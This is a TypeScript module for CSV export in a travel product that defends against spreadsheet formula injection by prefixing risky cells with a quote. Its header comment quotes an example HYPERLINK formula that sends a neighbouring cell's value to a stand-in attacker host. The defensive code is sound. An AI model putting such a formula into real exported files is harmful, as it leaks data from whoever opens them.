/**
 * CSV export — STEP-003.04 (REQ-A11Y-002).
 *
 * `REQ-A11Y-002` makes a table and CSV the equal of every visualization. That
 * makes export a security surface, not a formatting convenience.
 *
 * FORMULA INJECTION IS THE REAL RISK
 *   A cell whose text begins with `=`, `+`, `-`, `@`, tab or carriage return is
 *   interpreted as a FORMULA by Excel, LibreOffice and Google Sheets. A trip note
 *   reading:
 *
 *       =HYPERLINK("https://evil.example/?d="&A1,"Click me")
 *
 *   exfiltrates the adjacent cell the moment a colleague opens the file. The
 *   attacker never touches our servers — they type into a field we faithfully
 *   export, and the spreadsheet does the rest.
 *
 *   Our own data makes this worse than usual: trip briefs and collaborator
 *   comments are free text, and exports are meant to be shared.
 *
 *   Defence: prefix a single quote to any cell starting with a dangerous
 *   character. Spreadsheets treat the result as literal text and display it
 *   unchanged; the value survives, the execution does not.
 */

/** Characters that make a spreadsheet treat the cell as a formula. */
const FORMULA_START = /^[=+\-@\t\r]/;

/** Cells needing RFC 4180 quoting. */
const NEEDS_QUOTING = /[",\n\r]/;

export interface CsvOptions {
  /** Defaults to a comma. Some locales expect a semicolon. */
  readonly delimiter?: string;
  /**
   * Prefix a UTF-8 byte-order mark.
   *
   * Excel on Windows assumes the system codepage without one and mangles every
   * non-ASCII place name — "Kraków" becomes "KrakÃ³w". Default true, because
   * this product exports destination names by design.
   */
  readonly bom?: boolean;
}

/**
 * Escape one cell: neutralise formulas first, then quote.
 *
 * Order matters. Quoting first would put the `'` inside the quotes where the
 * spreadsheet still evaluates the formula on paste in some versions.
 */
export function escapeCell(value: unknown, delimiter = ','): string {
  if (value === null || value === undefined) return '';

  let text = String(value);

  if (FORMULA_START.test(text)) {
    text = `'${text}`;
  }

  const needsQuotes = NEEDS_QUOTING.test(text) || text.includes(delimiter);
  if (needsQuotes) {
    // RFC 4180: a literal double quote is doubled.
    return `"${text.replace(/"/g, '""')}"`;
  }
  return text;
}

export interface CsvColumn<Row> {
  readonly key: string;
  readonly header: string;
  readonly value: (row: Row) => unknown;
}

export function toCsv<Row>(
  rows: readonly Row[],
  columns: readonly CsvColumn<Row>[],
  options: CsvOptions = {},
): string {
  const delimiter = options.delimiter ?? ',';
  const bom = options.bom ?? true;

  const lines = [
    columns.map((column) => escapeCell(column.header, delimiter)).join(delimiter),
    ...rows.map((row) =>
      columns.map((column) => escapeCell(column.value(row), delimiter)).join(delimiter),
    ),
  ];

  // CRLF per RFC 4180 — Excel is the least forgiving consumer.
  return `${bom ? '﻿' : ''}${lines.join('\r\n')}\r\n`;
}

/**
 * Trigger a download in the browser.
 *
 * Separated from `toCsv` so the serialisation is testable without a DOM, and so
 * a caller can send the same bytes somewhere else without reimplementing them.
 */
export function downloadCsv(filename: string, contents: string): void {
  const blob = new Blob([contents], { type: 'text/csv;charset=utf-8' });
  const url = URL.createObjectURL(blob);
  const anchor = document.createElement('a');
  anchor.href = url;
  anchor.download = filename.endsWith('.csv') ? filename : `${filename}.csv`;
  anchor.click();
  // Without this the blob is retained for the lifetime of the document.
  URL.revokeObjectURL(url);
}
